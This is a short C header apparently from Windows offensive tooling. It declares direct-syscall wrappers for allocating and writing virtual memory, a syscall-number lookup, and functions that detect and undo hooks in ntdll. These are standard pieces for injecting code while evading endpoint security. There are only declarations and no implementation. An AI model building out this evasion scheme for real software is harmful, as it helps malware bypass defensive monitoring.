#ifndef EVASION_H
#define EVASION_H

#include <windows.h>
#include <stdbool.h>
#include <stdio.h>
#include <winternl.h>

DWORD GetSyscallNumber(LPCSTR functionName);

extern NTSTATUS custAVM(
    HANDLE hProcess,
    PVOID *BaseAddress,
    ULONG ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

extern NTSTATUS custWVM(
    HANDLE hProcess,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T BufferSize,
    PSIZE_T NumberOfBytesWritten
);

extern DWORD smID;

void SetSystemCall(DWORD value);

#ifdef _M_X64
#define PEB_OFFSET 0x60
#else
#define PEB_OFFSET 0x30
#endif

bool IsNtDllHooked();

void UnhookNtdll();

#endif // EVASION_H
